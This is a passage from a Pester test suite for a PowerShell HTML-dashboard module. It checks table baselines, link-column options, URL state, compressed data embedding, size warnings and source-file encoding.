            $r.Tables[0].BaselinePath | Should -Match "b\.$Ext$"
            $r.Tables[0].KeyField | Should -Be 'Name'
        }
        It 'warns and builds without markers when the file does not exist yet' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows -BaselinePath (Join-Path $script:tmp 'none.clixml') -KeyField 'Name' -WarningVariable w -WarningAction SilentlyContinue
            $r.Tables[0].Baseline | Should -BeNullOrEmpty
            ($w -join ' ') | Should -Match 'first run'
        }
        It 'rejects <Name>' -ForEach @(
            @{ Name = 'an unknown extension'; Splat = @{ BaselinePath = 'x.txt'; KeyField = 'Name' }; Msg = '*must end in*' }
            @{ Name = 'a missing -KeyField';  Splat = @{ BaselinePath = 'x.csv' }; Msg = '*needs -KeyField*' }
            @{ Name = '-Baseline as well';    Splat = @{ BaselinePath = 'x.csv'; KeyField = 'Name'; Baseline = @() }; Msg = '*not both*' }) {
            $r = New-DhDashboard -Title 'x'
            { Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows @Splat } | Should -Throw $Msg
        }
        It 'leaves a plain table spec without the new keys' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows
            $r.Tables[0].Contains('BaselinePath') | Should -BeFalse
        }
    }

    Context 'O11 link columns' {
        It 'emits urlTemplate, linkTarget and relativeLinks only when used' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows -Columns @(
                @{ Field = 'Name'; Label = 'N'; CellType = 'link'; UrlTemplate = 'https://portal/#app/{Id}'; LinkText = 'Open'; LinkTarget = 'same' }
                @{ Field = 'Page'; Label = 'P'; CellType = 'link'; RelativeLinks = $true }
                @{ Field = 'Cpu'; Label = 'C'; CellType = 'link' })
            $h = Export-DhTestHtml -Report $r
            $h | Should -Match '"urlTemplate":"https://portal/#app/\{Id\}","linkText":"Open","linkTarget":"same"'
            $h | Should -Not -Match '"field":"Name"[^}]*"urlField"'
            $h | Should -Match '"field":"Page"[^}]*"urlField":"Page","linkText":"","relativeLinks":true'
            $h | Should -Match '"field":"Cpu"[^}]*"urlField":"Cpu","linkText":""\}?'
            ([regex]::Match($h, '"field":"Cpu"[^}]*').Value) | Should -Not -Match 'urlTemplate|linkTarget|relativeLinks'
        }
        It 'rejects <Name>' -ForEach @(
            @{ Name = 'UrlTemplate with UrlField';       Col = @{ Field = 'Name'; Label = 'N'; CellType = 'link'; UrlTemplate = 'x{Id}'; UrlField = 'Id' }; Msg = '*not both*' }
            @{ Name = 'a template field not in the data'; Col = @{ Field = 'Name'; Label = 'N'; CellType = 'link'; UrlTemplate = 'x{Nope}' }; Msg = '*{Nope}*' }
            @{ Name = 'LinkTarget on a text column';     Col = @{ Field = 'Name'; Label = 'N'; LinkTarget = 'new' }; Msg = "*needs CellType = 'link'*" }
            @{ Name = 'an unknown LinkTarget';           Col = @{ Field = 'Name'; Label = 'N'; CellType = 'link'; LinkTarget = '_blank' }; Msg = "*'new' or 'same'*" }
            @{ Name = 'a non-boolean RelativeLinks';     Col = @{ Field = 'Name'; Label = 'N'; CellType = 'link'; RelativeLinks = 'yes' }; Msg = '*RelativeLinks*' }) {
            $r = New-DhDashboard -Title 'x'
            { Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows -Columns @($Col) } | Should -Throw $Msg
        }
        It 'accepts {{ and }} as literal braces in a template' {
            $r = New-DhDashboard -Title 'x'
            { Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:rows -Columns @(@{ Field = 'Name'; Label = 'N'; CellType = 'link'; UrlTemplate = 'x{{y}}{Id}' }) } | Should -Not -Throw
        }
        It 'shows a link column as the same link in the detail drawer' {
            $h = Export-DhTestHtml -Report (New-DhDashboard -Title 'x')
            (Get-DhTestJsFunction -Html $h -Name '_openDetail') | Should -Match '_linkFor\(c,row,row\[f\.field\]\)'
            (Get-DhTestJsFunction -Html $h -Name 'renderSection') | Should -Match 'dhLinkUrl\(it\._link, true\)'
        }
    }

    Context 'O6 -LinkState' {
        It 'stores the switch and marks every table only when it is on' {
            $on = New-DhDashboard -Title 'x' -LinkState
            $on.LinkState | Should -BeTrue
            Add-DhTable -Report $on -TableId 't' -Title 'T' -Data $script:rows
            (Export-DhTestHtml -Report $on) | Should -Match '"linkState":true'
            $off = New-DhDashboard -Title 'x'
            Add-DhTable -Report $off -TableId 't' -Title 'T' -Data $script:rows
            (Export-DhTestHtml -Report $off) | Should -Not -Match '"linkState"'
        }
        It 'writes table state into the address only through _saveLinkState, which needs the switch' {
            $h = Export-DhTestHtml -Report (New-DhDashboard -Title 'x')
            (Get-DhTestJsFunction -Html $h -Name '_saveLinkState') | Should -Match 'if \(!this\.linkState\) return;'
            $h | Should -Match 'var ts = dhTableStateAll\(engines\);'
            $h | Should -Match 'dhTableStateFinish\(engines\);'
        }
    }

    Context 'O5 -CompressData and -SizeBudgetMB' {
        BeforeAll {
            $script:big = 1..3000 | ForEach-Object { [pscustomobject]@{ Name = "server-$_"; Os = 'Windows Server 2022'; Site = "Site $($_ % 12)"; Note = 'the same long note repeated on every row' } }
        }
        It 'stores the table and block data gzip + base64 and the plain path stays the default' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $script:big
            Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 't' -Field 'Site'
            $plain = & $script:export $r
            $zip = & $script:export $r @{ CompressData = $true }
            $plain.Html | Should -Match 'var DH_ZDATA       = null;'
            $plain.Html | Should -Match 'server-2999'
            $zip.Html | Should -Not -Match 'server-2999'
            $zip.Html | Should -Match 'var TABLES_CONFIG  = \[\];'
            $m = [regex]::Match($zip.Html, 'var DH_ZDATA       = \{"t":"([A-Za-z0-9+/=]+)","b":"([A-Za-z0-9+/=]+)"\};')
            $m.Success | Should -BeTrue
            # compare the data part: the runtime (CSS + JS) is the same in both files
            $empty = (& $script:export (New-DhDashboard -Title 'x')).Bytes
            ($zip.Bytes - $empty) | Should -BeLessThan (($plain.Bytes - $empty) / 4)
            # the payload is exactly the plain JSON
            $gz = [IO.Compression.GZipStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($m.Groups[1].Value)), [IO.Compression.CompressionMode]::Decompress)
            $json = [IO.StreamReader]::new($gz).ReadToEnd()
            $tables = $json | ConvertFrom-Json
            $tables[0].id | Should -Be 't'
            @($tables[0].data).Count | Should -Be 3000
        }
        It 'warns above the size budget, naming the biggest table, and never with 0' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 'big' -Title 'T' -Data $script:big
            $w = (& $script:export $r @{ SizeBudgetMB = 1 }).Warnings -join ' '
            $w | Should -Match "over the 1 MB budget.*'big'"
            $w | Should -Match 'Try -CompressData'
            ((& $script:export $r @{ SizeBudgetMB = 0 }).Warnings -join ' ') | Should -Not -Match 'budget'
            ((& $script:export $r).Warnings -join ' ') | Should -Not -Match 'budget'
        }
        It 'unpacks before boot only when there is something to unpack' {
            $h = Export-DhTestHtml -Report (New-DhDashboard -Title 'x')
            $h | Should -Match 'if \(DH_ZDATA\) dhUnzipConfig\(DH_ZDATA, dhBoot\); else dhBoot\(\);'
            (Get-DhTestJsFunction -Html $h -Name 'dhUnzipConfig') | Should -Match "role', 'alert'"
        }
    }

    Context 'O2 and O4 tree tables' {
        It 'warns above 20000 rows by default and throws only above 100000' {
            $src =Get-Content (Join-Path $PSScriptRoot '../DashHtml/Public/Add-DhTreeTable.ps1') -Raw
            $src | Should -Match '\[int\]      \$MaxRows = 20000'
            $src | Should -Match '-gt 100000\)'
        }
        It 'windows above 2,000 rows, adds position and size, and has CSV buttons' {
            $h = Export-DhTestHtml -Report (New-DhDashboard -Title 'x')
            $h | Should -Match 'var DH_TT_WIN_MIN = 2000, DH_TT_PRINT_MAX = 2000;'
            $fn = Get-DhTestJsFunction -Html $h -Name 'renderTreeTable'
            $fn | Should -Match 'aria-posinset'
            $fn | Should -Match 'data-tt="csv"'
            $fn | Should -Match "csvButton\('members'\)"
            $fn | Should -Match 'dhTtPrintHooks\.push'
            (Get-DhTestJsFunction -Html $h -Name 'dhBeforePrint') | Should -Match 'dhTtPrintHooks\.forEach\(function \(h\) \{ h\.before\(\); \}\)'
            $h | Should -Match '\.tt-tree\.tt-win \.dh-tree-row \{ height: var\(--tt-row-h\)'
        }
    }
}

Describe 'Module source files' {
    It 'are UTF-8 without BOM and with LF line endings (2.5.3)' {
        $root = Join-Path $PSScriptRoot '..'
        $bad = foreach ($f in Get-ChildItem -Path (Join-Path $root 'DashHtml'), (Join-Path $root 'DashHtml.Design') -Recurse -File -Include *.ps1, *.psm1, *.psd1 |
                Where-Object { $_.FullName -notmatch '[\\/]Vendor[\\/]' }) {
            $b = [IO.File]::ReadAllBytes($f.FullName)
            if ($b.Length -ge 3 -and $b[0] -eq 0xEF -and $b[1] -eq 0xBB -and $b[2] -eq 0xBF) { "$($f.Name): BOM" }
            if ([Array]::IndexOf($b, [byte]13) -ge 0) { "$($f.Name): CR" }
        }
        @($bad) | Should -BeNullOrEmpty
    }
}
